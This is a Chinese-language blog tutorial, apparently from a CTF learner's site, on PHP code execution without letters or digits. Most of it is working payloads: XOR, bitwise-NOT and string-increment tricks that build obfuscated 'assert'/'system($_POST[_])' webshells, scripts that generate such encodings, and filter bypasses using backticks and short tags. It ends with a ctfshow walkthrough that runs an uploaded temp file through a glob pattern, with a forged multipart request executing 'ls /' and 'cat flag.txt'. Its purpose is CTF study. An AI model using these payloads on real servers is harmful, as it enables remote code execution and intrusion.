<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;   <span class="comment">//得到assert，此时$_=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$__</span> = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;   <span class="comment">//得到_POST，此时$__=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">//assert($_POST[_])</span></span><br><span class="line"><span class="comment">//放到一排就是</span></span><br><span class="line"><span class="variable">$_</span> = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;<span class="variable">$__</span> = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;<span class="variable">$___</span> = <span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>注意到这里<code>assert</code>和<code>_POST</code>都用的URL编码表示，如果直接以<code>\x9e\x8c\x8c\x9a\x8d\x8b</code>这种UTF-8字符表示，并不能识别出为UTF-8字符，而是会被识别为<code>英文+数字</code>的字符串。</p>
<h3 id="自增"><a href="#自增" class="headerlink" title="++自增"></a><code>++</code>自增</h3><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p>
<p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
<p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
<p><img src="https://s2.loli.net/2023/11/18/32DfL9smSGYbqzE.png" alt="image.png"></p>
<p>故有payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/HL68pxnvTZBG2ac.png" alt="20200805165424-430e5c2c-d6f9-1"></p>
<h2 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h2><p>PHP7中新增了函数动态调用：定义一个函数后，可以将函数名或者字符串赋值给一个变量；最后使用变量名代替函数名动态调用函数即可。比如，动态调用，可以用两种方法动态调用<code>md5()</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;md5&#x27;</span>)(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="string">&#x27;md5&#x27;</span>;<span class="variable">$func</span>(<span class="string">&#x27;123&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/1n3odWxJaLKFVPN.png" alt="image-20231115164947854"></p>
<p>有了函数动态调用，就可以更方便的进行异或和取反操作了。</p>
<h3 id="异或-1"><a href="#异或-1" class="headerlink" title="异或"></a>异或</h3><p>可以利用异或脚本，获取任意想要的字符串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;<span class="comment">//想要异或得到的字符串</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>演示：</p>
<p>使用异或脚本获取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo:%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span><br><span class="line">(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)()//相当于(&#x27;phpinfo&#x27;)()，执行了phpinfo()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/D5TbSzqZkdflN3h.png" alt="image-20231115165424122"></p>
<h3 id="取反-1"><a href="#取反-1" class="headerlink" title="取反"></a>取反</h3><p>可以利用取反脚本，获取任意想要的字符串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;<span class="comment">//想要取反的字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;~&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(~<span class="variable">$a</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo &quot;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>演示：</p>
<p>使用取反脚本获取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo:~%8F%97%8F%96%91%99%90</span><br><span class="line">system:~%8c%86%8c%8b%9a%92</span><br><span class="line">whoami:~%88%97%90%9e%92%96</span><br><span class="line">//可以得到</span><br><span class="line">system(&#x27;whoami&#x27;):(~%8c%86%8c%8b%9a%92)(~%88%97%90%9e%92%96)//相当于(&#x27;system&#x27;)(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/s2IMFQfh4tYVXeU.png" alt="image-20231115170055796"></p>
<p>注意：</p>
<p><code>eval</code>和<code>echo</code>不是PHP函数，不能被拼接调用或者动态调用。</p>
<p><code>assert</code>在php5中是函数，可以拼接调用；但在php7.1中不是函数，就和<code>eval</code>一样了。</p>
<p>用汉字取反：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]; <span class="comment">//array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>; <span class="comment">//arrayarray</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>); <span class="comment">//$_=(array==arrayarray) false 0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>); <span class="comment">//$__=(array==array) true 1</span></span><br><span class="line"><span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>]; <span class="comment">//system</span></span><br><span class="line"><span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>]; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$$____</span>[_]); <span class="comment">//system($_POST[_]);</span></span><br><span class="line"><span class="comment">//写在一行，得到payload：system($_POST[_])</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];<span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];<span class="variable">$___</span>(<span class="variable">$$____</span>[_]);</span><br></pre></td></tr></table></figure>

<h2 id="各种过滤和绕过"><a href="#各种过滤和绕过" class="headerlink" title="各种过滤和绕过"></a>各种过滤和绕过</h2><h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了<code>_</code></h3><p>在我们上面的例子中，<code>_</code>的主要用途就是在构造变量。但其实最简便的方法里面，我们可以完全不用<code>_</code>，这里给出一个例子。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`&#123;$&#123;~<span class="string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析下这个Payload，<code>?&gt;</code>闭合了eval自带的<code>&lt;?</code>标签。接下来使用了短标签。<code>&#123;&#125;</code>包含的PHP代码可以被执行，<code>~&quot;%a0%b8%ba%ab&quot;</code>为<code>&quot;_GET&quot;</code>，通过反引号进行shell命令执行。最后我们只要GET传参<code>%a0</code>即可执行命令。</p>
<p><img src="https://s2.loli.net/2023/11/18/w2jpKGTMUrkmBSx.png" alt="20200805165502-59635bd0-d6f9-1"></p>
<h3 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了;"></a>过滤了<code>;</code></h3><p>分号我们只是用在结束PHP语句上，我们只要把所有的PHP语句改成短标签形式，就可以不使用<code>;</code>了。</p>
<h3 id="过滤了-2"><a href="#过滤了-2" class="headerlink" title="过滤了$"></a>过滤了<code>$</code></h3><p>过滤了<code>$</code>的影响是我们彻底不能构造变量了。</p>
<h4 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h4><p>在PHP7中，我们可以使用<code>($a)()</code>这种方法来执行命令。</p>
<p>这里我使用<code>call_user_func()</code>来举例(不使用<code>assert()</code>的原因上面已经解释过)。<br>我构造了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell=(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">93</span>%<span class="number">93</span>%a0%<span class="number">8</span>a%<span class="number">8</span>c%<span class="number">9</span>a%<span class="number">8</span>d%a0%<span class="number">99</span>%<span class="number">8</span>a%<span class="number">91</span>%<span class="number">9</span>c(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>,~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>e%<span class="number">92</span>%<span class="number">96</span>,<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>其中<code>~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c</code>是”<code>call_user_func</code>“，<code>~%8c%86%8c%8b%9a%92</code>是”<code>system</code>“，<code>~%88%97%90%9e%92%96</code>是”<code>whoami</code>“。</p>
<p>或者我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<h4 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h4><p>开头先贴一篇P神的文章：</p>
<p>接下来是自我总结的，实在不行再去看看原文。</p>
<p>php5并不支持php7这种表达方式。</p>
<p>先写两个有趣的Linux shell知识点：</p>
<ul>
<li>shell下可以利用 <code>.</code> 来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ul>
<p>先贴wp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="构造原理："><a href="#构造原理：" class="headerlink" title="构造原理："></a>构造原理：</h5><h6 id=""><a href="#" class="headerlink" title="&lt;?= ?&gt;"></a><code>&lt;?= ?&gt;</code></h6><p>在php中，<code>&lt;? ?&gt;</code>称为短标签，<code>&lt;?php ?&gt;</code>称为长标签。修改PHP.ini文件配置 <code>short_open_tag = On</code> 才可使用短标签。php5.4.0以后， <code>&lt;?= </code>总是可代替 <code>&lt;? echo</code>。</p>
<h6 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;&#96;"></a>反引号&#96;&#96;</h6><p>在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。</p>
<h6 id="-1"><a href="#-1" class="headerlink" title="."></a><code>.</code></h6><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
<h6 id="加号"><a href="#加号" class="headerlink" title="加号 +"></a>加号 <code>+</code></h6><p>URL编码中空格为<code>%20</code>，<code>+</code>表示为<code>%2B</code>。然而url中<code>+</code>也可以表示空格，要表示<code>+</code>号必须得用<code>%2B</code>。</p>
<h6 id="匹配文件名"><a href="#匹配文件名" class="headerlink" title="匹配文件名"></a>匹配文件名</h6><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，在linux系统下，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
<p><code>*</code>星号，匹配任何字符，<code>?</code> 问号，匹配任意一个字符</p>
<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
<p><img src="https://s2.loli.net/2023/11/18/wlA7FbxYuyGpiMs.png" alt="img"></p>
<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
<p><img src="https://s2.loli.net/2023/11/18/1MuRev5ANV6BGSm.png" alt="image.png"></p>
<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
<p>我们可以利用<code>[@-[]</code>来表示大写字母：</p>
<p><img src="https://s2.loli.net/2023/11/18/TR3CqlYkZm92UK4.png" alt="image.png"></p>
<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
<p>发送数据包如下（在burp伪造上传）：</p>
<p><img src="https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.624e7ada5f87.png" alt="image.png"></p>
<p>成功执行任意命令。</p>
<h5 id="小小例题"><a href="#小小例题" class="headerlink" title="小小例题"></a>小小例题</h5><p>[ctfshow] 红包题第二弹</p>
<p>点开一看什么也没有</p>
<p><img src="https://s2.loli.net/2023/11/18/N2slPLT4Xwphk1W.png" alt="image-20231118221512566"></p>
<p>惯例先查看源代码，发现hint</p>
<p><img src="https://s2.loli.net/2023/11/18/4MFmWbe3Ix2JSAn.png" alt="image-20231118221556502"></p>
<p>GET任意cmd，得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码审计，要求cmd不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等，可惜不能用p神匹配大写的方法</p>
<p>但是我们知道临时文件存放地址在tmp目录，且以php开头，恰好本题没有过滤p</p>
<p>故我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure>

<p>但是我们还要伪造上传，以上请求头修改了3个地方：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"> </span><br><span class="line">#! /bin/sh</span><br><span class="line"> </span><br><span class="line">ls /</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/19/hTQJEnGds5X6c83.png" alt="屏幕截图 2023-11-19 083136"></p>
<p>发现<code>flag.txt</code>，将<code>ls /</code>改为<code>cat flag.txt</code></p>
<p><img src="https://s2.loli.net/2023/11/19/RLoFs8nHp13V5TU.png" alt="屏幕截图 2023-11-19 083203"></p>
<p><strong>Content-Type</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>(默认值) ：上传键值对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">multipart/form-data</span><br></pre></td></tr></table></figure>

<p>上传文件</p>
<p><strong>boundary</strong></p>
<p>boundary为边界分隔符</p>
<pre><code>文件开始标记：-----------------------------10242300956292313528205888

文件结束标记：-----------------------------10242300956292313528205888--

其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。
</code></pre>
<p><strong>文件内容</strong></p>
<p><code>#! /bin/sh </code>指定命令解释器，<code>#!</code>是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：<code>sh,csh,ksh,tcsh。</code>首先用命令 <code>ls / </code> 来查看服务器根目录有哪些文件，发现有<code>flag.txt</code>，然后再用 <code>cat /flag.txt</code> 即可。</p>
<p>当然，也可以构造一个前端上传的html页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;h1&gt;Welcome to Tutorials Point&lt;/h1&gt;</span><br><span class="line">   &lt;form action=&quot;http://13f4152e-6ad9-4586-b8d0-c26c0c2c2a45.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;file&quot; name=&quot;uploadedFile&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>上传一个txt文档，用burp抓包，在改文件内容和cmd的值就行了</p>
<p><img src="https://s2.loli.net/2023/11/19/xVkav6YIHjKfgXN.png" alt="image-20231119172006358"></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
</search>
